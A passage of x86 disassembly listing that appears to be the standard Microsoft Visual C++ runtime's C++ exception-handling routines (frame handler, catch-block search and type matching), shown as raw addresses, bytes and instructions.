  402ad5:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%ebx)
  402adb:	75 2a                	jne    0x402b07
  402add:	83 7b 10 03          	cmpl   $0x3,0x10(%ebx)
  402ae1:	75 24                	jne    0x402b07
  402ae3:	81 7b 14 20 05 93 19 	cmpl   $0x19930520,0x14(%ebx)
  402aea:	74 12                	je     0x402afe
  402aec:	81 7b 14 21 05 93 19 	cmpl   $0x19930521,0x14(%ebx)
  402af3:	74 09                	je     0x402afe
  402af5:	81 7b 14 22 05 93 19 	cmpl   $0x19930522,0x14(%ebx)
  402afc:	75 09                	jne    0x402b07
  402afe:	39 73 1c             	cmp    %esi,0x1c(%ebx)
  402b01:	0f 84 c3 02 00 00    	je     0x402dca
  402b07:	e8 da fb ff ff       	call   0x4026e6
  402b0c:	39 70 1c             	cmp    %esi,0x1c(%eax)
  402b0f:	74 62                	je     0x402b73
  402b11:	e8 d0 fb ff ff       	call   0x4026e6
  402b16:	8b 40 1c             	mov    0x1c(%eax),%eax
  402b19:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402b1c:	e8 c5 fb ff ff       	call   0x4026e6
  402b21:	ff 75 f4             	push   -0xc(%ebp)
  402b24:	53                   	push   %ebx
  402b25:	89 70 1c             	mov    %esi,0x1c(%eax)
  402b28:	e8 7d 09 00 00       	call   0x4034aa
  402b2d:	59                   	pop    %ecx
  402b2e:	59                   	pop    %ecx
  402b2f:	84 c0                	test   %al,%al
  402b31:	75 40                	jne    0x402b73
  402b33:	8b 7d f4             	mov    -0xc(%ebp),%edi
  402b36:	39 37                	cmp    %esi,(%edi)
  402b38:	0f 8e 2b 02 00 00    	jle    0x402d69
  402b3e:	8b 47 04             	mov    0x4(%edi),%eax
  402b41:	68 80 47 41 00       	push   $0x414780
  402b46:	8b 4c 06 04          	mov    0x4(%esi,%eax,1),%ecx
  402b4a:	e8 b7 05 00 00       	call   0x403106
  402b4f:	84 c0                	test   %al,%al
  402b51:	0f 85 17 02 00 00    	jne    0x402d6e
  402b57:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402b5a:	83 c6 10             	add    $0x10,%esi
  402b5d:	40                   	inc    %eax
  402b5e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402b61:	3b 07                	cmp    (%edi),%eax
  402b63:	0f 8d 00 02 00 00    	jge    0x402d69
  402b69:	eb d3                	jmp    0x402b3e
  402b6b:	8b 55 10             	mov    0x10(%ebp),%edx
  402b6e:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402b71:	eb 06                	jmp    0x402b79
  402b73:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402b76:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402b79:	33 c0                	xor    %eax,%eax
  402b7b:	89 7d d0             	mov    %edi,-0x30(%ebp)
  402b7e:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402b81:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%ebx)
  402b87:	0f 85 a6 01 00 00    	jne    0x402d33
  402b8d:	83 7b 10 03          	cmpl   $0x3,0x10(%ebx)
  402b91:	0f 85 9c 01 00 00    	jne    0x402d33
  402b97:	81 7b 14 20 05 93 19 	cmpl   $0x19930520,0x14(%ebx)
  402b9e:	74 16                	je     0x402bb6
  402ba0:	81 7b 14 21 05 93 19 	cmpl   $0x19930521,0x14(%ebx)
  402ba7:	74 0d                	je     0x402bb6
  402ba9:	81 7b 14 22 05 93 19 	cmpl   $0x19930522,0x14(%ebx)
  402bb0:	0f 85 7d 01 00 00    	jne    0x402d33
  402bb6:	8b 75 24             	mov    0x24(%ebp),%esi
  402bb9:	39 47 0c             	cmp    %eax,0xc(%edi)
  402bbc:	0f 86 11 01 00 00    	jbe    0x402cd3
  402bc2:	ff 75 20             	push   0x20(%ebp)
  402bc5:	8d 45 d0             	lea    -0x30(%ebp),%eax
  402bc8:	57                   	push   %edi
  402bc9:	ff 75 14             	push   0x14(%ebp)
  402bcc:	51                   	push   %ecx
  402bcd:	50                   	push   %eax
  402bce:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402bd1:	50                   	push   %eax
  402bd2:	e8 0d f2 ff ff       	call   0x401de4
  402bd7:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  402bda:	83 c4 18             	add    $0x18,%esp
  402bdd:	8b 45 c0             	mov    -0x40(%ebp),%eax
  402be0:	89 45 d8             	mov    %eax,-0x28(%ebp)
  402be3:	89 55 f4             	mov    %edx,-0xc(%ebp)
  402be6:	3b 55 cc             	cmp    -0x34(%ebp),%edx
  402be9:	0f 83 e4 00 00 00    	jae    0x402cd3
  402bef:	6b ca 14             	imul   $0x14,%edx,%ecx
  402bf2:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  402bf5:	8b 00                	mov    (%eax),%eax
  402bf7:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402bfa:	6a 05                	push   $0x5
  402bfc:	8b 70 10             	mov    0x10(%eax),%esi
  402bff:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402c02:	03 f1                	add    %ecx,%esi
  402c04:	59                   	pop    %ecx
  402c05:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402c07:	39 45 9c             	cmp    %eax,-0x64(%ebp)
  402c0a:	0f 8f a4 00 00 00    	jg     0x402cb4
  402c10:	3b 45 a0             	cmp    -0x60(%ebp),%eax
  402c13:	0f 8f 9b 00 00 00    	jg     0x402cb4
  402c19:	33 c9                	xor    %ecx,%ecx
  402c1b:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402c1e:	39 4d a8             	cmp    %ecx,-0x58(%ebp)
  402c21:	0f 84 8d 00 00 00    	je     0x402cb4
  402c27:	8b 53 1c             	mov    0x1c(%ebx),%edx
  402c2a:	8b 42 0c             	mov    0xc(%edx),%eax
  402c2d:	8b 30                	mov    (%eax),%esi
  402c2f:	83 c0 04             	add    $0x4,%eax
  402c32:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402c35:	8b 45 ac             	mov    -0x54(%ebp),%eax
  402c38:	89 75 dc             	mov    %esi,-0x24(%ebp)
  402c3b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402c3e:	8b f0                	mov    %eax,%esi
  402c40:	8d 7d b0             	lea    -0x50(%ebp),%edi
  402c43:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402c44:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402c45:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402c46:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402c47:	8b 75 dc             	mov    -0x24(%ebp),%esi
  402c4a:	8b 7d e0             	mov    -0x20(%ebp),%edi
  402c4d:	85 f6                	test   %esi,%esi
  402c4f:	7e 24                	jle    0x402c75
  402c51:	52                   	push   %edx
  402c52:	ff 37                	push   (%edi)
  402c54:	8d 45 b0             	lea    -0x50(%ebp),%eax
  402c57:	50                   	push   %eax
  402c58:	e8 a9 02 00 00       	call   0x402f06
  402c5d:	83 c4 0c             	add    $0xc,%esp
  402c60:	85 c0                	test   %eax,%eax
  402c62:	75 22                	jne    0x402c86
  402c64:	8b 53 1c             	mov    0x1c(%ebx),%edx
  402c67:	4e                   	dec    %esi
  402c68:	83 c7 04             	add    $0x4,%edi
  402c6b:	85 f6                	test   %esi,%esi
  402c6d:	7f e2                	jg     0x402c51
  402c6f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402c72:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402c75:	41                   	inc    %ecx
  402c76:	83 c0 10             	add    $0x10,%eax
  402c79:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402c7c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402c7f:	3b 4d a8             	cmp    -0x58(%ebp),%ecx
  402c82:	75 ba                	jne    0x402c3e
  402c84:	eb 2b                	jmp    0x402cb1
  402c86:	ff 75 1c             	push   0x1c(%ebp)
  402c89:	8d 45 9c             	lea    -0x64(%ebp),%eax
  402c8c:	ff 75 e8             	push   -0x18(%ebp)
  402c8f:	ff 75 24             	push   0x24(%ebp)
  402c92:	ff 75 20             	push   0x20(%ebp)
  402c95:	50                   	push   %eax
  402c96:	ff 37                	push   (%edi)
  402c98:	8d 45 b0             	lea    -0x50(%ebp),%eax
  402c9b:	50                   	push   %eax
  402c9c:	ff 75 18             	push   0x18(%ebp)
  402c9f:	ff 75 14             	push   0x14(%ebp)
  402ca2:	ff 75 fc             	push   -0x4(%ebp)
  402ca5:	ff 75 0c             	push   0xc(%ebp)
  402ca8:	53                   	push   %ebx
  402ca9:	e8 fd fc ff ff       	call   0x4029ab
  402cae:	83 c4 30             	add    $0x30,%esp
  402cb1:	8b 55 f4             	mov    -0xc(%ebp),%edx
  402cb4:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  402cb7:	42                   	inc    %edx
  402cb8:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402cbb:	83 c1 14             	add    $0x14,%ecx
  402cbe:	89 55 f4             	mov    %edx,-0xc(%ebp)
  402cc1:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  402cc4:	3b 55 cc             	cmp    -0x34(%ebp),%edx
  402cc7:	0f 82 28 ff ff ff    	jb     0x402bf5
  402ccd:	8b 7d 18             	mov    0x18(%ebp),%edi
  402cd0:	8b 75 24             	mov    0x24(%ebp),%esi
  402cd3:	80 7d 1c 00          	cmpb   $0x0,0x1c(%ebp)
  402cd7:	74 0a                	je     0x402ce3
  402cd9:	6a 01                	push   $0x1
  402cdb:	53                   	push   %ebx
  402cdc:	e8 cf f6 ff ff       	call   0x4023b0
  402ce1:	59                   	pop    %ecx
  402ce2:	59                   	pop    %ecx
  402ce3:	8b 07                	mov    (%edi),%eax
  402ce5:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
  402cea:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  402cef:	72 68                	jb     0x402d59
  402cf1:	8b 47 20             	mov    0x20(%edi),%eax
  402cf4:	c1 e8 02             	shr    $0x2,%eax
  402cf7:	83 7f 1c 00          	cmpl   $0x0,0x1c(%edi)
  402cfb:	75 0c                	jne    0x402d09
  402cfd:	a8 01                	test   $0x1,%al
  402cff:	74 58                	je     0x402d59
  402d01:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  402d05:	75 52                	jne    0x402d59
  402d07:	eb 04                	jmp    0x402d0d
  402d09:	a8 01                	test   $0x1,%al
  402d0b:	74 15                	je     0x402d22
  402d0d:	e8 d4 f9 ff ff       	call   0x4026e6
  402d12:	89 58 10             	mov    %ebx,0x10(%eax)
  402d15:	e8 cc f9 ff ff       	call   0x4026e6
  402d1a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402d1d:	89 48 14             	mov    %ecx,0x14(%eax)
  402d20:	eb 47                	jmp    0x402d69
  402d22:	ff 77 1c             	push   0x1c(%edi)
  402d25:	53                   	push   %ebx
  402d26:	e8 7f 07 00 00       	call   0x4034aa
  402d2b:	59                   	pop    %ecx
  402d2c:	59                   	pop    %ecx
  402d2d:	84 c0                	test   %al,%al
  402d2f:	74 5d                	je     0x402d8e
  402d31:	eb 26                	jmp    0x402d59
  402d33:	39 47 0c             	cmp    %eax,0xc(%edi)
  402d36:	76 21                	jbe    0x402d59
  402d38:	38 45 1c             	cmp    %al,0x1c(%ebp)
  402d3b:	0f 85 89 00 00 00    	jne    0x402dca
  402d41:	ff 75 24             	push   0x24(%ebp)
  402d44:	ff 75 20             	push   0x20(%ebp)
  402d47:	51                   	push   %ecx
  402d48:	57                   	push   %edi
  402d49:	ff 75 14             	push   0x14(%ebp)
  402d4c:	52                   	push   %edx
  402d4d:	ff 75 0c             	push   0xc(%ebp)
  402d50:	53                   	push   %ebx
  402d51:	e8 7a 00 00 00       	call   0x402dd0
  402d56:	83 c4 20             	add    $0x20,%esp
  402d59:	e8 88 f9 ff ff       	call   0x4026e6
  402d5e:	83 78 1c 00          	cmpl   $0x0,0x1c(%eax)
  402d62:	75 66                	jne    0x402dca
  402d64:	5f                   	pop    %edi
  402d65:	5e                   	pop    %esi
  402d66:	5b                   	pop    %ebx
  402d67:	c9                   	leave
  402d68:	c3                   	ret
  402d69:	e8 1b 25 00 00       	call   0x405289
  402d6e:	6a 01                	push   $0x1
  402d70:	53                   	push   %ebx
  402d71:	e8 3a f6 ff ff       	call   0x4023b0
  402d76:	59                   	pop    %ecx
  402d77:	59                   	pop    %ecx
  402d78:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  402d7b:	e8 31 03 00 00       	call   0x4030b1
  402d80:	68 44 26 41 00       	push   $0x412644
  402d85:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  402d88:	50                   	push   %eax
  402d89:	e8 2f 0d 00 00       	call   0x403abd
  402d8e:	e8 53 f9 ff ff       	call   0x4026e6
  402d93:	89 58 10             	mov    %ebx,0x10(%eax)
  402d96:	e8 4b f9 ff ff       	call   0x4026e6
  402d9b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402d9e:	89 48 14             	mov    %ecx,0x14(%eax)
  402da1:	85 f6                	test   %esi,%esi
  402da3:	75 03                	jne    0x402da8
  402da5:	8b 75 0c             	mov    0xc(%ebp),%esi
  402da8:	53                   	push   %ebx
  402da9:	56                   	push   %esi
  402daa:	e8 2b f2 ff ff       	call   0x401fda
  402daf:	57                   	push   %edi
  402db0:	ff 75 14             	push   0x14(%ebp)
  402db3:	ff 75 0c             	push   0xc(%ebp)
  402db6:	e8 ef 05 00 00       	call   0x4033aa
  402dbb:	57                   	push   %edi
  402dbc:	e8 a6 07 00 00       	call   0x403567
  402dc1:	83 c4 10             	add    $0x10,%esp
  402dc4:	50                   	push   %eax
  402dc5:	e8 57 05 00 00       	call   0x403321
  402dca:	e8 f6 24 00 00       	call   0x4052c5
  402dcf:	cc                   	int3
  402dd0:	55                   	push   %ebp
  402dd1:	8b ec                	mov    %esp,%ebp
  402dd3:	83 ec 38             	sub    $0x38,%esp
  402dd6:	53                   	push   %ebx
  402dd7:	8b 5d 08             	mov    0x8(%ebp),%ebx
  402dda:	81 3b 03 00 00 80    	cmpl   $0x80000003,(%ebx)
  402de0:	0f 84 17 01 00 00    	je     0x402efd
  402de6:	56                   	push   %esi
  402de7:	57                   	push   %edi
  402de8:	e8 f9 f8 ff ff       	call   0x4026e6
  402ded:	33 ff                	xor    %edi,%edi
  402def:	39 78 08             	cmp    %edi,0x8(%eax)
  402df2:	74 46                	je     0x402e3a
  402df4:	57                   	push   %edi
  402df5:	ff 15 7c d0 40 00    	call   *0x40d07c
  402dfb:	8b f0                	mov    %eax,%esi
  402dfd:	e8 e4 f8 ff ff       	call   0x4026e6
  402e02:	39 70 08             	cmp    %esi,0x8(%eax)
  402e05:	74 33                	je     0x402e3a
  402e07:	81 3b 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%ebx)
  402e0d:	74 2b                	je     0x402e3a
  402e0f:	81 3b 52 43 43 e0    	cmpl   $0xe0434352,(%ebx)
  402e15:	74 23                	je     0x402e3a
  402e17:	ff 75 24             	push   0x24(%ebp)
  402e1a:	ff 75 20             	push   0x20(%ebp)
  402e1d:	ff 75 18             	push   0x18(%ebp)
  402e20:	ff 75 14             	push   0x14(%ebp)
  402e23:	ff 75 10             	push   0x10(%ebp)
  402e26:	ff 75 0c             	push   0xc(%ebp)
  402e29:	53                   	push   %ebx
  402e2a:	e8 82 f0 ff ff       	call   0x401eb1
  402e2f:	83 c4 1c             	add    $0x1c,%esp
  402e32:	85 c0                	test   %eax,%eax
  402e34:	0f 85 c1 00 00 00    	jne    0x402efb
  402e3a:	8b 45 18             	mov    0x18(%ebp),%eax
  402e3d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402e40:	89 7d f0             	mov    %edi,-0x10(%ebp)
  402e43:	39 78 0c             	cmp    %edi,0xc(%eax)
  402e46:	0f 86 b4 00 00 00    	jbe    0x402f00
  402e4c:	ff 75 20             	push   0x20(%ebp)
  402e4f:	50                   	push   %eax
  402e50:	ff 75 14             	push   0x14(%ebp)
  402e53:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402e56:	ff 75 1c             	push   0x1c(%ebp)
  402e59:	50                   	push   %eax
  402e5a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  402e5d:	50                   	push   %eax
  402e5e:	e8 81 ef ff ff       	call   0x401de4
  402e63:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402e66:	83 c4 18             	add    $0x18,%esp
  402e69:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402e6c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402e6f:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402e72:	3b 55 e8             	cmp    -0x18(%ebp),%edx
  402e75:	0f 83 80 00 00 00    	jae    0x402efb
  402e7b:	6b ca 14             	imul   $0x14,%edx,%ecx
  402e7e:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  402e81:	8b 00                	mov    (%eax),%eax
  402e83:	8d 7d c8             	lea    -0x38(%ebp),%edi
  402e86:	6a 05                	push   $0x5
  402e88:	8b 70 10             	mov    0x10(%eax),%esi
  402e8b:	8b 45 1c             	mov    0x1c(%ebp),%eax
  402e8e:	03 f1                	add    %ecx,%esi
  402e90:	59                   	pop    %ecx
  402e91:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402e93:	39 45 c8             	cmp    %eax,-0x38(%ebp)
  402e96:	7f 4e                	jg     0x402ee6
  402e98:	3b 45 cc             	cmp    -0x34(%ebp),%eax
  402e9b:	7f 49                	jg     0x402ee6
  402e9d:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402ea0:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402ea3:	c1 e1 04             	shl    $0x4,%ecx
  402ea6:	83 c0 f0             	add    $0xfffffff0,%eax
  402ea9:	03 c1                	add    %ecx,%eax
  402eab:	8b 48 04             	mov    0x4(%eax),%ecx
  402eae:	85 c9                	test   %ecx,%ecx
  402eb0:	74 06                	je     0x402eb8
  402eb2:	80 79 08 00          	cmpb   $0x0,0x8(%ecx)
  402eb6:	75 2e                	jne    0x402ee6
  402eb8:	f6 00 40             	testb  $0x40,(%eax)
  402ebb:	75 29                	jne    0x402ee6
  402ebd:	6a 00                	push   $0x0
  402ebf:	6a 01                	push   $0x1
  402ec1:	ff 75 24             	push   0x24(%ebp)
  402ec4:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402ec7:	ff 75 20             	push   0x20(%ebp)
  402eca:	51                   	push   %ecx
  402ecb:	6a 00                	push   $0x0
  402ecd:	50                   	push   %eax
  402ece:	ff 75 18             	push   0x18(%ebp)
  402ed1:	ff 75 14             	push   0x14(%ebp)
  402ed4:	ff 75 10             	push   0x10(%ebp)
  402ed7:	ff 75 0c             	push   0xc(%ebp)
  402eda:	53                   	push   %ebx
  402edb:	e8 cb fa ff ff       	call   0x4029ab
  402ee0:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402ee3:	83 c4 30             	add    $0x30,%esp
  402ee6:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402ee9:	42                   	inc    %edx
  402eea:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402eed:	83 c1 14             	add    $0x14,%ecx
  402ef0:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402ef3:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  402ef6:	3b 55 e8             	cmp    -0x18(%ebp),%edx
  402ef9:	72 86                	jb     0x402e81
  402efb:	5f                   	pop    %edi
  402efc:	5e                   	pop    %esi
  402efd:	5b                   	pop    %ebx
  402efe:	c9                   	leave
  402eff:	c3                   	ret
  402f00:	e8 c0 23 00 00       	call   0x4052c5
  402f05:	cc                   	int3
  402f06:	55                   	push   %ebp
  402f07:	8b ec                	mov    %esp,%ebp
  402f09:	8b 55 08             	mov    0x8(%ebp),%edx
  402f0c:	53                   	push   %ebx
  402f0d:	56                   	push   %esi
  402f0e:	57                   	push   %edi
  402f0f:	8b 42 04             	mov    0x4(%edx),%eax
  402f12:	85 c0                	test   %eax,%eax
  402f14:	74 76                	je     0x402f8c
  402f16:	8d 48 08             	lea    0x8(%eax),%ecx
  402f19:	80 39 00             	cmpb   $0x0,(%ecx)
  402f1c:	74 6e                	je     0x402f8c
  402f1e:	f6 02 80             	testb  $0x80,(%edx)
  402f21:	8b 7d 0c             	mov    0xc(%ebp),%edi
  402f24:	74 05                	je     0x402f2b
  402f26:	f6 07 10             	testb  $0x10,(%edi)
  402f29:	75 61                	jne    0x402f8c
  402f2b:	8b 5f 04             	mov    0x4(%edi),%ebx
  402f2e:	33 f6                	xor    %esi,%esi
  402f30:	3b c3                	cmp    %ebx,%eax
  402f32:	74 30                	je     0x402f64
  402f34:	8d 43 08             	lea    0x8(%ebx),%eax
  402f37:	8a 19                	mov    (%ecx),%bl
  402f39:	3a 18                	cmp    (%eax),%bl
  402f3b:	75 1a                	jne    0x402f57
  402f3d:	84 db                	test   %bl,%bl
  402f3f:	74 12                	je     0x402f53
  402f41:	8a 59 01             	mov    0x1(%ecx),%bl
  402f44:	3a 58 01             	cmp    0x1(%eax),%bl
  402f47:	75 0e                	jne    0x402f57
  402f49:	83 c1 02             	add    $0x2,%ecx
  402f4c:	83 c0 02             	add    $0x2,%eax
  402f4f:	84 db                	test   %bl,%bl
  402f51:	75 e4                	jne    0x402f37
  402f53:	8b c6                	mov    %esi,%eax
  402f55:	eb 05                	jmp    0x402f5c
  402f57:	1b c0                	sbb    %eax,%eax
  402f59:	83 c8 01             	or     $0x1,%eax
  402f5c:	85 c0                	test   %eax,%eax
  402f5e:	74 04                	je     0x402f64
  402f60:	33 c0                	xor    %eax,%eax
  402f62:	eb 2b                	jmp    0x402f8f
  402f64:	f6 07 02             	testb  $0x2,(%edi)
  402f67:	74 05                	je     0x402f6e
  402f69:	f6 02 08             	testb  $0x8,(%edx)
  402f6c:	74 1a                	je     0x402f88
  402f6e:	8b 45 10             	mov    0x10(%ebp),%eax
  402f71:	f6 00 01             	testb  $0x1,(%eax)
  402f74:	74 05                	je     0x402f7b
  402f76:	f6 02 01             	testb  $0x1,(%edx)
  402f79:	74 0d                	je     0x402f88
  402f7b:	f6 00 02             	testb  $0x2,(%eax)
  402f7e:	74 05                	je     0x402f85
  402f80:	f6 02 02             	testb  $0x2,(%edx)
  402f83:	74 03                	je     0x402f88
  402f85:	33 f6                	xor    %esi,%esi
  402f87:	46                   	inc    %esi
  402f88:	8b c6                	mov    %esi,%eax
  402f8a:	eb 03                	jmp    0x402f8f
  402f8c:	33 c0                	xor    %eax,%eax
  402f8e:	40                   	inc    %eax
  402f8f:	5f                   	pop    %edi
  402f90:	5e                   	pop    %esi
  402f91:	5b                   	pop    %ebx
  402f92:	5d                   	pop    %ebp
  402f93:	c3                   	ret
  402f94:	55                   	push   %ebp
  402f95:	8b ec                	mov    %esp,%ebp
  402f97:	53                   	push   %ebx
  402f98:	56                   	push   %esi
  402f99:	57                   	push   %edi
  402f9a:	ff 75 10             	push   0x10(%ebp)
  402f9d:	e8 2a 06 00 00       	call   0x4035cc
  402fa2:	59                   	pop    %ecx
  402fa3:	e8 3e f7 ff ff       	call   0x4026e6
  402fa8:	8b 4d 18             	mov    0x18(%ebp),%ecx
  402fab:	33 f6                	xor    %esi,%esi
  402fad:	8b 55 08             	mov    0x8(%ebp),%edx
  402fb0:	bb ff ff ff 1f       	mov    $0x1fffffff,%ebx
  402fb5:	bf 22 05 93 19       	mov    $0x19930522,%edi
  402fba:	39 70 20             	cmp    %esi,0x20(%eax)
  402fbd:	75 22                	jne    0x402fe1
  402fbf:	81 3a 63 73 6d e0    	cmpl   $0xe06d7363,(%edx)
  402fc5:	74 1a                	je     0x402fe1
  402fc7:	81 3a 26 00 00 80    	cmpl   $0x80000026,(%edx)
  402fcd:	74 12                	je     0x402fe1
  402fcf:	8b 01                	mov    (%ecx),%eax
  402fd1:	23 c3                	and    %ebx,%eax
  402fd3:	3b c7                	cmp    %edi,%eax
  402fd5:	72 0a                	jb     0x402fe1
  402fd7:	f6 41 20 01          	testb  $0x1,0x20(%ecx)
  402fdb:	0f 85 ad 00 00 00    	jne    0x40308e
  402fe1:	f6 42 04 66          	testb  $0x66,0x4(%edx)
  402fe5:	74 26                	je     0x40300d
  402fe7:	39 71 04             	cmp    %esi,0x4(%ecx)
  402fea:	0f 84 9e 00 00 00    	je     0x40308e
  402ff0:	39 75 1c             	cmp    %esi,0x1c(%ebp)
  402ff3:	0f 85 95 00 00 00    	jne    0x40308e
  402ff9:	51                   	push   %ecx
  402ffa:	ff 75 14             	push   0x14(%ebp)
  402ffd:	ff 75 0c             	push   0xc(%ebp)
  403000:	e8 a5 03 00 00       	call   0x4033aa
  403005:	83 c4 0c             	add    $0xc,%esp
  403008:	e9 81 00 00 00       	jmp    0x40308e
  40300d:	39 71 0c             	cmp    %esi,0xc(%ecx)
  403010:	75 1e                	jne    0x403030
  403012:	8b 01                	mov    (%ecx),%eax
  403014:	23 c3                	and    %ebx,%eax
  403016:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  40301b:	72 05                	jb     0x403022
  40301d:	39 71 1c             	cmp    %esi,0x1c(%ecx)
  403020:	75 0e                	jne    0x403030
  403022:	3b c7                	cmp    %edi,%eax
  403024:	72 68                	jb     0x40308e
  403026:	8b 41 20             	mov    0x20(%ecx),%eax
  403029:	c1 e8 02             	shr    $0x2,%eax
  40302c:	a8 01                	test   $0x1,%al
  40302e:	74 5e                	je     0x40308e
  403030:	81 3a 63 73 6d e0    	cmpl   $0xe06d7363,(%edx)
  403036:	75 3a                	jne    0x403072
  403038:	83 7a 10 03          	cmpl   $0x3,0x10(%edx)
  40303c:	72 34                	jb     0x403072
  40303e:	39 7a 14             	cmp    %edi,0x14(%edx)
  403041:	76 2f                	jbe    0x403072
  403043:	8b 42 1c             	mov    0x1c(%edx),%eax
  403046:	8b 70 08             	mov    0x8(%eax),%esi
  403049:	85 f6                	test   %esi,%esi
  40304b:	74 25                	je     0x403072
  40304d:	0f b6 45 24          	movzbl 0x24(%ebp),%eax
  403051:	50                   	push   %eax
  403052:	ff 75 20             	push   0x20(%ebp)
  403055:	ff 75 1c             	push   0x1c(%ebp)
  403058:	51                   	push   %ecx
  403059:	ff 75 14             	push   0x14(%ebp)
  40305c:	8b ce                	mov    %esi,%ecx
  40305e:	ff 75 10             	push   0x10(%ebp)
  403061:	ff 75 0c             	push   0xc(%ebp)
  403064:	52                   	push   %edx
  403065:	ff 15 3c d1 40 00    	call   *0x40d13c
  40306b:	ff d6                	call   *%esi
  40306d:	83 c4 20             	add    $0x20,%esp
  403070:	eb 1f                	jmp    0x403091
  403072:	ff 75 20             	push   0x20(%ebp)
  403075:	ff 75 1c             	push   0x1c(%ebp)
  403078:	ff 75 24             	push   0x24(%ebp)
  40307b:	51                   	push   %ecx
  40307c:	ff 75 14             	push   0x14(%ebp)
  40307f:	ff 75 10             	push   0x10(%ebp)
  403082:	ff 75 0c             	push   0xc(%ebp)
  403085:	52                   	push   %edx
  403086:	e8 a0 f9 ff ff       	call   0x402a2b
  40308b:	83 c4 20             	add    $0x20,%esp
  40308e:	33 c0                	xor    %eax,%eax
  403090:	40                   	inc    %eax
  403091:	5f                   	pop    %edi
  403092:	5e                   	pop    %esi
  403093:	5b                   	pop    %ebx
  403094:	5d                   	pop    %ebp
  403095:	c3                   	ret
  403096:	55                   	push   %ebp
  403097:	8b ec                	mov    %esp,%ebp
  403099:	56                   	push   %esi
  40309a:	ff 75 08             	push   0x8(%ebp)
  40309d:	8b f1                	mov    %ecx,%esi
  40309f:	e8 25 00 00 00       	call   0x4030c9
  4030a4:	c7 06 c0 d1 40 00    	movl   $0x40d1c0,(%esi)
  4030aa:	8b c6                	mov    %esi,%eax
  4030ac:	5e                   	pop    %esi
  4030ad:	5d                   	pop    %ebp
  4030ae:	c2 04 00             	ret    $0x4
  4030b1:	83 61 04 00          	andl   $0x0,0x4(%ecx)
  4030b5:	8b c1                	mov    %ecx,%eax
  4030b7:	83 61 08 00          	andl   $0x0,0x8(%ecx)
  4030bb:	c7 41 04 c8 d1 40 00 	movl   $0x40d1c8,0x4(%ecx)
  4030c2:	c7 01 c0 d1 40 00    	movl   $0x40d1c0,(%ecx)
  4030c8:	c3                   	ret
  4030c9:	55                   	push   %ebp
  4030ca:	8b ec                	mov    %esp,%ebp
  4030cc:	56                   	push   %esi
  4030cd:	8b f1                	mov    %ecx,%esi
  4030cf:	8d 46 04             	lea    0x4(%esi),%eax
  4030d2:	c7 06 a0 d1 40 00    	movl   $0x40d1a0,(%esi)
  4030d8:	83 20 00             	andl   $0x0,(%eax)
  4030db:	83 60 04 00          	andl   $0x0,0x4(%eax)
  4030df:	50                   	push   %eax
  4030e0:	8b 45 08             	mov    0x8(%ebp),%eax
  4030e3:	83 c0 04             	add    $0x4,%eax
  4030e6:	50                   	push   %eax
  4030e7:	e8 4f 09 00 00       	call   0x403a3b
  4030ec:	59                   	pop    %ecx
  4030ed:	59                   	pop    %ecx
  4030ee:	8b c6                	mov    %esi,%eax
  4030f0:	5e                   	pop    %esi
  4030f1:	5d                   	pop    %ebp
  4030f2:	c2 04 00             	ret    $0x4
  4030f5:	8d 41 04             	lea    0x4(%ecx),%eax
  4030f8:	c7 01 a0 d1 40 00    	movl   $0x40d1a0,(%ecx)
  4030fe:	50                   	push   %eax
  4030ff:	e8 9a 09 00 00       	call   0x403a9e
  403104:	59                   	pop    %ecx
  403105:	c3                   	ret
  403106:	55                   	push   %ebp
  403107:	8b ec                	mov    %esp,%ebp
  403109:	8b 45 08             	mov    0x8(%ebp),%eax
  40310c:	83 c0 04             	add    $0x4,%eax
  40310f:	50                   	push   %eax
  403110:	8d 41 04             	lea    0x4(%ecx),%eax
